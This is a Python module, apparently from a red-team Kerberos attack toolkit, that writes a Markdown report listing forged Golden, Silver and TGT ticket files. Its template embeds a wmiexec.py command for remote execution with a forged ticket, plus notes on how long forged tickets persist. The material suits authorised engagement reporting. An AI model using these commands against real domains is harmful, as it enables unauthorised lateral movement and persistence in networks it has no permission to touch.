"""
Report Generator — Produces a Markdown report summarizing
ticket attack results, generated tickets, and cleanup guidance.
"""

from datetime import datetime
from pathlib import Path


class ReportGenerator:
    """Generate engagement reports for ticket-based attacks."""

    def __init__(self, domain: str, dc_ip: str, output_dir: Path):
        self.domain = domain
        self.dc_ip = dc_ip
        self.output_dir = output_dir

    def generate(self, domain_sid: str = ""):
        """Write a Markdown report inventorying all generated tickets."""
        report_file = self.output_dir / "ticket_attack_report.md"
        tickets = list(self.output_dir.glob("*.ccache"))

        report = f"""# Ticket Attack Report — {self.domain}

## Operation Summary
- Domain: {self.domain}
- DC: {self.dc_ip}
- Domain SID: {domain_sid}
- Timestamp: {datetime.now().isoformat()}

## Generated Tickets
"""
        for ticket in tickets:
            if "golden" in ticket.name:
                ticket_type = "Golden"
            elif "silver" in ticket.name:
                ticket_type = "Silver"
            else:
                ticket_type = "TGT"
            report += f"- [{ticket_type}] {ticket.name}\n"

        report += f"""
## Usage
```bash
export KRB5CCNAME=<ticket_file>
wmiexec.py {self.domain}/<user>@<target> -k -no-pass
```

## Persistence Notes
- Golden Tickets valid until KRBTGT password is rotated TWICE
- Silver Tickets valid until service account password is rotated
- Diamond Tickets have normal ticket lifetime but can be re-forged

## Cleanup Required
- Remove .ccache files from attack system
- Recommend KRBTGT password rotation (twice) to invalidate Golden Tickets
"""
        report_file.write_text(report)
        print(f"\n[+] Report: {report_file}")